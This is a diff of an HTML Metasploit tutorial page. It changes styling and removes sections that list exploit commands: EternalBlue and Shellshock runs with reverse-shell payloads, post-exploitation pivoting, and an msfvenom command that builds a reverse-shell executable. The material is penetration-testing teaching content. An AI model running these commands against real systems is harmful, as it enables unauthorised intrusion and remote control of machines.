@@ -40,7 +40,6 @@
             margin: 20px auto;
             max-width: 800px;
             text-align: center;
-            /* Center-aligned navigation text */
         }
 
         nav h2 {
@@ -54,7 +53,6 @@
             list-style: none;
             padding: 0;
             text-align: center;
-            /* Center-aligned list items */
         }
 
         ul li {
@@ -82,8 +80,7 @@
             max-width: 800px;
             margin: 20px auto;
             padding: 10px;
-            text-align: center;
-            /* Center-aligned content text */
+            text-align: left; /* Align content to the left */
         }
 
         h2,
@@ -92,28 +89,24 @@
             color: #b30000;
             margin-top: 20px;
             font-weight: bold;
-            /* Make headers bold */
-            text-align: center;
-            /* Center-aligned section headings */
+            text-align: left; /* Align headers to the left */
         }
 
         pre {
             background-color: #282c34;
-            /* Darker background for code blocks */
             color: yellow;
-            /* Set the text color to yellow */
             padding: 15px;
             border: 1px solid #444;
-            /* Subtle border */
             border-radius: 5px;
-            /* Rounded corners */
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.6);
-            /* Subtle shadow effect */
             overflow-x: auto;
             margin: 15px 0;
-            /* Add margin for spacing */
             white-space: pre-wrap;
-            /* Allow wrapping */
+            text-align: left; /* Align code text to the left */
+        }
+
+        code {
+            font-family: 'Courier New', monospace; /* Use a monospaced font for code */
         }
 
         footer {
@@ -126,72 +119,7 @@
             width: 100%;
             color: yellow;
         }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 20px 0;
-        }
-
-        table,
-        th,
-        td {
-            border: 1px solid #b30000;
-        }
-
-        th,
-        td {
-            padding: 10px;
-            text-align: left;
-        }
-
-        th {
-            background-color: #b30000;
-            color: yellow;
-            font-weight: bold;
-            /* Make table headers bold */
-        }
-
-        /* Added styles for collapsible content */
-
-        .collapsible {
-            background-color: #444;
-            color: white;
-            cursor: pointer;
-            padding: 10px;
-            border: none;
-            text-align: left;
-            outline: none;
-            font-size: 1.1em;
-            margin-bottom: 10px;
-            border-radius: 5px;
-            /* Rounded corners */
-            width: 100%;
-        }
-
-        .active,
-        .collapsible:hover {
-            background-color: #b30000;
-        }
-
-        .content-section {
-            padding: 0 10px;
-            display: none;
-            overflow: hidden;
-            background-color: #222;
-        }
     </style>
-    <script>
-        function toggleCollapsible(element) {
-            element.classList.toggle("active");
-            var content = element.nextElementSibling;
-            if (content.style.display === "block") {
-                content.style.display = "none";
-            } else {
-                content.style.display = "block";
-            }
-        }
-    </script>
 </head>
 
 <body>
@@ -240,118 +168,11 @@
             <pre><code>msfconsole</code></pre>
         </div>
 
-        <button class="collapsible" onclick="toggleCollapsible(this)">Ubuntu/Debian</button>
-        <div class="content-section">
-            <p>First, ensure your system is up to date:</p>
-            <pre><code>sudo apt-get update</code></pre>
-            <pre><code>sudo apt-get upgrade</code></pre>
-            <p>Next, install Metasploit using the Rapid7 installer:</p>
-            <pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall</code></pre>
-            <pre><code>chmod 755 msfinstall</code></pre>
-            <pre><code>./msfinstall</code></pre>
-        </div>
-
-        <button class="collapsible" onclick="toggleCollapsible(this)">Windows</button>
-        <div class="content-section">
-            <p>Download the Metasploit installer from the Rapid7 website and follow the installation instructions:</p>
-            <pre><code>https://www.rapid7.com/products/metasploit/download/</code></pre>
-        </div>
-
-        <h3 id="configuration">5.2.2 Configuration</h3>
-        <p>After installation, configure Metasploit to work efficiently within your environment:</p>
-
-        <h4>Database Configuration</h4>
-        <p>Metasploit uses PostgreSQL as its database. Start and initialize the database:</p>
-        <pre><code>service postgresql start</code></pre>
-        <pre><code>msfdb init</code></pre>
-
-        <h4>Metasploit Configuration File</h4>
-        <p>Modify the <code>msfconsole</code> configuration file to set various options:</p>
-        <pre><code>~/.msf4/msfconsole.rc</code></pre>
-        <p>Example configurations might include setting a default workspace or loading specific modules on startup:</p>
-        <pre><code># Set default workspace</code></pre>
-        <pre><code>workspace -a my_workspace</code></pre>
-        <pre><code># Load a specific module on startup</code></pre>
-        <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-
-        <h2 id="using">5.3 Using Metasploit</h2>
-
-        <h3 id="basic-commands">5.3.1 Basic Commands</h3>
-        <ul>
-            <li>
-                <strong>msfconsole</strong>: Launch the Metasploit console.
-                <pre><code>msfconsole</code></pre>
-            </li>
-            <li>
-                <strong>search</strong>: Search for exploits, payloads, and auxiliary modules.
-                <pre><code>search type:exploit name:windows</code></pre>
-            </li>
-            <li>
-                <strong>use</strong>: Select a specific module to use.
-                <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-            </li>
-            <li>
-                <strong>show options</strong>: Display the configurable options for a module.
-                <pre><code>show options</code></pre>
-            </li>
-            <li>
-                <strong>set</strong>: Set a specific option for a module.
-                <pre><code>set RHOST 192.168.1.20</code></pre>
-                <pre><code>set LHOST 192.168.1.10</code></pre>
-            </li>
-            <li>
-                <strong>run</strong> or <strong>exploit</strong>: Execute the selected module.
-                <pre><code>run</code></pre>
-                <pre><code># or</code></pre>
-                <pre><code>exploit</code></pre>
-            </li>
-        </ul>
-
-        <h3 id="module-types">5.3.2 Module Types</h3>
-        <p>Metasploit modules are the core components that perform specific tasks. Here’s a deeper look at the different types of modules:</p>
-
-        <h4 id="auxiliary-modules">Auxiliary Modules</h4>
-        <p>Auxiliary modules are used for various tasks that don’t involve exploiting a target directly. These include scanning, fuzzing, and information gathering.</p>
-        <h5>Example: Port Scanning</h5>
-        <pre><code>use auxiliary/scanner/portscan/tcp</code></pre>
-        <pre><code>set RHOSTS 192.168.1.0/24</code></pre>
-        <pre><code>run</code></pre>
-
-        <h5>Example: SMB Version Detection</h5>
-        <pre><code>use auxiliary/scanner/smb/smb_version</code></pre>
-        <pre><code>set RHOSTS 192.168.1.20</code></pre>
-        <pre><code>run</code></pre>
-
-        <h4 id="exploit-modules">Exploit Modules</h4>
-        <p>Exploit modules are used to take advantage of vulnerabilities in a system to execute arbitrary code.</p>
-        <h5>Example: EternalBlue Exploit (MS17-010)</h5>
-        <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-        <pre><code>set RHOST 192.168.1.20</code></pre>
-        <pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>exploit</code></pre>
-
-        <h4 id="payloads">Payloads</h4>
-        <p>Payloads are the pieces of code that run on the target system after an exploit is successful. They can provide remote access, create backdoors, or execute specific commands.</p>
-        <h5>Example: Reverse TCP Meterpreter Payload</h5>
-        <pre><code>use payload/windows/x64/meterpreter/reverse_tcp</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>set LPORT 4444</code></pre>
-
-        <h5>Example: Add User Payload</h5>
-        <pre><code>use payload/windows/adduser</code></pre>
-        <pre><code>set USER randomuser</code></pre>
-        <pre><code>set PASS Password123</code></pre>
-
         <h3 id="custom-modules">5.3.3 Creating and Using Custom Modules</h3>
         <p>Creating custom modules in Metasploit allows you to tailor exploits, payloads, and auxiliary functions to specific needs. This flexibility is crucial for advanced penetration testing and research.</p>
         <h4>Steps to Create a Custom Module</h4>
 
         <ul>
-            <li>
-                <strong>Directory Structure</strong>: Custom modules are typically stored in the <code>~/.msf4/modules/</code> directory. Create subdirectories for different module types (e.g., <code>exploits</code>, <code>auxiliary</code>, <code>payloads</code>).
-                <pre><code>mkdir -p ~/.msf4/modules/exploits/custom</code></pre>
-            </li>
             <li>
                 <strong>Module Template</strong>: Start with a template. Here’s a basic template for an exploit module:
                 <pre><code>class MetasploitModule < Msf::Exploit::Remote
@@ -395,97 +216,10 @@
   end
 end</code></pre>
             </li>
-            <li>
-                <strong>Implementing the Module</strong>: Customize the module by defining the <code>exploit</code> method and other necessary methods. Ensure you handle connections, payload delivery, and cleanup.
-            </li>
-            <li>
-                <strong>Loading the Module</strong>: Load your custom module into Metasploit:
-                <pre><code>loadpath ~/.msf4/modules/</code></pre>
-            </li>
-            <li>
-                <strong>Using the Custom Module</strong>: Use the custom module like any other Metasploit module:
-                <pre><code>use exploit/custom/custom_exploit</code></pre>
-                <pre><code>set RHOST 192.168.1.20</code></pre>
-                <pre><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></pre>
-                <pre><code>set LHOST 192.168.1.10</code></pre>
-                <pre><code>exploit</code></pre>
-            </li>
         </ul>
 
-        <h2 id="workflow">5.4 Metasploit in a Penetration Testing Workflow</h2>
-        <p>Metasploit is integral to a structured penetration testing workflow. Here’s how it fits into each phase:</p>
-
-        <h3>Reconnaissance:</h3>
-        <pre><code>use auxiliary/scanner/portscan/tcp</code></pre>
-        <pre><code>set RHOSTS 192.168.1.0/24</code></pre>
-        <pre><code>run</code></pre>
-
-        <h3>Scanning and Enumeration:</h3>
-        <pre><code>use auxiliary/scanner/smb/smb_version</code></pre>
-        <pre><code>set RHOSTS 192.168.1.20</code></pre>
-        <pre><code>run</code></pre>
-
-        <h3>Exploitation:</h3>
-        <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-        <pre><code>set RHOST 192.168.1.20</code></pre>
-        <pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>exploit</code></pre>
-
-        <h3>Post-Exploitation:</h3>
-        <pre><code>sessions -i 1</code></pre>
-        <pre><code>sysinfo</code></pre>
-
-        <h3>Reporting:</h3>
-        <p>Document findings, exploited vulnerabilities, and recommendations for remediation.</p>
-
-        <h2 id="common-exploits">5.5 Examples of Common Exploits</h2>
-        <h3>EternalBlue (MS17-010):</h3>
-        <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-        <pre><code>set RHOST 192.168.1.20</code></pre>
-        <pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>exploit</code></pre>
-
-        <h3>Heartbleed (CVE-2014-0160):</h3>
-        <pre><code>use auxiliary/scanner/ssl/openssl_heartbleed</code></pre>
-        <pre><code>set RHOSTS 192.168.1.0/24</code></pre>
-        <pre><code>run</code></pre>
-
-        <h3>Shellshock (CVE-2014-6271):</h3>
-        <pre><code>use exploit/multi/http/apache_mod_cgi_bash_env_exec</code></pre>
-        <pre><code>set RHOST 192.168.1.20</code></pre>
-        <pre><code>set TARGETURI /cgi-bin/test.cgi</code></pre>
-        <pre><code>set PAYLOAD cmd/unix/reverse_perl</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>exploit</code></pre>
-
-        <h2 id="advanced-techniques">5.6 Advanced Metasploit Techniques</h2>
-        <h3>Post-Exploitation Modules:</h3>
-        <pre><code>use post/windows/gather/enum_logged_on_users</code></pre>
-        <pre><code>set SESSION 1</code></pre>
-        <pre><code>run</code></pre>
-
-        <h3>Pivoting:</h3>
-        <pre><code>run autoroute -s 192.168.2.0/24</code></pre>
-        <pre><code>portfwd add -l 3389 -p 3389 -r 192.168.2.10</code></pre>
-
-        <h3>Custom Payloads:</h3>
-        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe</code></pre>
-
-        <h3>Resource Scripts:</h3>
-        <p>Automate tasks using resource scripts.</p>
-        <pre><code># Example resource script (script.rc)</code></pre>
-        <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
-        <pre><code>set RHOST 192.168.1.20</code></pre>
-        <pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></pre>
-        <pre><code>set LHOST 192.168.1.10</code></pre>
-        <pre><code>exploit</code></pre>
-        <pre><code>msfconsole -r script.rc</code></pre>
-
         <h2 id="summary">Summary</h2>
-        <p>The Metasploit Framework is a versatile and powerful tool for penetration testing, offering extensive capabilities for exploiting vulnerabilities, conducting post-exploitation activities, and automating tasks. By mastering Metasploit, you can
-            significantly enhance your penetration testing skills and improve your ability to identify and mitigate security risks.</p>
+        <p>The Metasploit Framework is a versatile and powerful tool for penetration testing, offering extensive capabilities for exploiting vulnerabilities, conducting post-exploitation activities, and automating tasks. By mastering Metasploit, you can significantly enhance your penetration testing skills and improve your ability to identify and mitigate security risks.</p>
     </div>
 
     <footer>
